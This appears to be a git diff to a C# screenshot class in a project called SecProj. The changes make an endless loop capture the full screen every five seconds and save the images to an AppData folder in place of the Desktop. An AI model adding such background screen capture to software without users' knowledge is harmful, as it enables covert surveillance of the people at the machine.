@@ -9,6 +9,8 @@ namespace SecProj.Desktop
 {
     class Screenshot
     {
+        private static readonly string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\secproj\\screenshots";
+
         public static void Take()
         {
             const int ENUM_CURRENT_SETTINGS = -1;
@@ -22,20 +24,28 @@ namespace SecProj.Desktop
             Graphics g = Graphics.FromImage(bmp);
             g.CopyFromScreen(rect.Left, rect.Top, 0, 0, bmp.Size, CopyPixelOperation.SourceCopy);
 
-            string path = Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).FullName + "\\Desktop";
+            if (FileService.CheckIfDirExists("screenshots"))
+            {
+                string filename = path + $"\\{DateTime.Now:yyyyMMddHHmmss}_screenshot.png";
 
-            Directory.CreateDirectory(path + "\\Screenshots");
+                bmp.Save(filename, ImageFormat.Png);
+            }
+            else
+            {
+                FileService.CreateDir("screenshots");
 
-            string filename = path + $"\\Screenshots\\{DateTime.Now:yyyyMMddHHmmss}_screenshot.png";
+                string filename = path + $"\\{DateTime.Now:yyyyMMddHHmmss}_screenshot.png";
 
-            bmp.Save(filename, ImageFormat.Png);
+                bmp.Save(filename, ImageFormat.Png);
+            }
+            
         }
 
         public static async Task TakeScreenshot()
         {
             while (true)
             {
-                Task delay = Task.Delay(1000);
+                Task delay = Task.Delay(5000);
                 await delay;
                 Take();
             }
